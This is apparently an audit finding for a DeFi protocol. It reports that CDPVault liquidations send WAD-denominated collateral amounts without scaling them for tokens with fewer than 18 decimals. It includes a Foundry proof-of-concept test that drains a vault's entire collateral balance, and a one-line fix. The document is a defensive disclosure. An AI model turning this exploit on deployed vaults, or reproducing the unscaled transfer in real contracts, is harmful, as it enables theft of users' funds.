# Vulnerability details

## Impact
For CDPVaults with Collateral tokens with less than 18 decimals, liquidations break due to attempting to transfer takeCollateral, which is WAD and not adjusted to the collateral token's decimals. 

Best case: Liquidations fail, potentially allowing bad debt to accrue within the protocol unnecessarily. 

Worst case: A liquidator is able to steal the CDPVault's entire balance of collateral tokens. 

This affects both liquidatePosition and liquidatePositionBadDebt. 

Note for Judges: I believe this issue should be in scope. While the protocol did specify some specific tokens to be used as collateral, they did not specify that only tokens with 18 decimal values will be used. Additionally, CDPVault.sol Deposit/Borrow/etc methods include logic for converting a tokens decimals to WAD, as well as included tests for these methods in CDPVault.t.sol, indicating that at the very least tokens with < 18 decimals are to be supported as collateral at a future time. Seeing as how this issue directly places user funds at stake, I would argue the issue is in scope and valid. 

## Proof of Concept
The provided POC showcases both best and worst case scenarios. 

```
function test_liquidate_partial_decimals() public {
        uint8 digits = 6;
        MockTokenScaled tokenScaled = new MockTokenScaled("TestToken", "TST", digits);
        // oracle comments specify price in WAD
        oracle.updateSpot(address(tokenScaled), 1 ether);
        CDPVault mockVault = createCDPVault(tokenScaled, 150 ether, 0, 1.25 ether, 1 ether, 1 ether);
        createGaugeAndSetGauge(address(mockVault), address(tokenScaled));
        // create position
        uint collateral = 100 * 10 ** digits;
        uint debt = 80 ether;
    
        tokenScaled.mint(address(this), collateral);
        tokenScaled.approve(address(mockVault), collateral);
        
        (uint256 collateralBefore, , , , , ) = mockVault.positions(address(this));

        // use deposit to adjust for decimals
        mockVault.deposit(address(this), collateral);

        // use borrow to adjust for decimals
        mockVault.borrow(address(this), address(this), debt);
        // mockVault.modifyCollateralAndDebt(address(this), address(this), address(this), 0, debt);

        (uint256 collateralAfter, , , , , ) = mockVault.positions(address(this));

        uint256 scaledAmount = wdiv(collateral, mockVault.tokenScale());
        assertEq(collateralAfter, collateralBefore + scaledAmount);


        // liquidate position
        address position = address(this);
        // comments specify repay amount as WAD
        uint256 repayAmount = 40 * 10 ** digits;
        uint256 scaledRepayAmount = wdiv(repayAmount, mockVault.tokenScale());
        oracle.updateSpot(address(tokenScaled), 0.80 ether);
        
        // mint unscaled amount
        mockWETH.approve(address(mockVault), type(uint256).max);
        
        uint256 creditBefore = credit(address(this));
        
        // attempt liq with scaled amount
        vm.expectRevert("ERC20: transfer amount exceeds balance");
        mockVault.liquidatePosition(position, scaledRepayAmount);
        
        // simulate stealing all collateral in vault
        // assume vault has multiple positions such that the collateral balance is 50 WAD.
        tokenScaled.mint(address(mockVault), 50 ether - collateral);

        uint vaultCollateralBefore = tokenScaled.balanceOf(address(mockVault));
        // attempt liq with scaled amount
        mockVault.liquidatePosition(position, scaledRepayAmount);

        uint vaultCollateralAfter = tokenScaled.balanceOf(address(mockVault));

        assertEq(vaultCollateralBefore, 50 ether);
        assertEq(vaultCollateralAfter, 0);
    }
```

## Recommended Mitigation Steps
Adjust the transfer of the collateral token in both liquidatePosition and liquidatePositionBadDebt: 
```
token.safeTransfer(msg.sender, wmul(takeCollateral, tokenScale));
```
